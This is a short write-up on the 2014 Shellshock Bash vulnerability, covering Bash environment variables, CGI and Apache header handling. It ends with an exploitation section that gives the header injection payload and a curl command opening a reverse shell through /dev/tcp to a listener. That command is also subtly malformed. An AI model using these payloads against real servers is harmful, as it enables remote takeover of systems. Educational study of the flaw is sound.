# Shell Shock Vulnerability Write Up

## Overview
Shell Shock, also known as the Bash Bug, is a critical vulnerability that came to light in 2014, affecting the GNU Bash shell. This vulnerability enables attackers to execute arbitrary commands on a target system, posing significant security risks. This write-up delves into the Shell Shock vulnerability, offering insights into its discovery, impact, and implications for the security landscape.

## Background

Shellshock, also known as the Bash Bug, was a significant security vulnerability that was discovered in 2014. The vulnerability affected the Bash shell, a widely used command-line interface for Unix and Unix-like operating systems, including Linux. This vulnerability allowed attackers to execute malicious code on a target system, potentially gaining unauthorized access and control.

It is hard to estimate how many devices were impacted by the vulnerability, but Bash is a widely used tool on Linux system. In 2014, tens of millions of devices were running Linux or Linux-like operating systems. Devices from routers, smart-tvs, and Internet of Things devices, to lots of public infrasturcture, to data centers and cloud computer use Linux as their backbone. Due to the wide usage of linux, the impact of the vulnerability is high. The risk of this vulnerability is also high, because systems can easily be compromised through the vulnerability. 


### Bash Environment Variables
Bash environment variables are fundamental components of the Bash shell. These variables store information that can be accessed and manipulated by shell scripts, commands, and running programs. They serve various purposes, such as defining system-wide settings, user-specific configurations, and providing data to processes. Environment variables are typically accessed using the dollar sign ($) followed by the variable name, such as $PATH for defining the system's executable search path. They can store data like file paths, user preferences, system parameters, or temporary values, making them essential for customizing and configuring the behavior of the shell and its associated processes. Additionally, Bash environment variables facilitate communication between different programs and are a crucial part of system administration and software development on Unix-based systems.

### Shellshock on Apache

The vulnerability was commonly present on Web Application Servers that were hosted on Linux Servers. The servers would use the bash command line for server side processing. Most often, the Apache server would be using CGI to process and handle user requests. In some implementations, request headers would be communicated to Bash through the use of environmental variables. The  variables would be executed by the shell when handling requests. An attacker could set the value of a header, the user-agent, or other field, to include arbitrary code. When this field was written to an environment variable, it would be executed by the shell. This gives the attacker arbitrary remote code execution, which can be used to as an initial foothold in an attack. 

### Common Gateway Interface
Common Gateway Interface (CGI) is a set of standards and protocols that enables web servers to interact with external programs and scripts to generate dynamic web content. CGI scripts are typically written in languages like Perl, Python, or Shell, and they facilitate the processing of data from web forms and other user inputs, allowing web servers to execute these scripts and return dynamic web pages to users. CGI has been a fundamental technology in the early days of web development, although it has become less common in favor of more efficient server-side technologies like PHP, ASP.NET, and JavaScript frameworks.

## Exploiting ShellShock

To exploit shellshock, simply include this payload in a header in the request:
```
() { :;}; <cmd>
```

Obviously, change the cmd to the command that you want to run. You will not recieve any output of the commands execution. However, you can leverage this to gain a reverse shell. </br>

Example curl request that exploits the Bash Bug to get a reverse shell. 
```curl -X POST -h "User-Agent: bash_bug () { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/127.0.0.1/8888 0>&1 &" sparrow.fly```
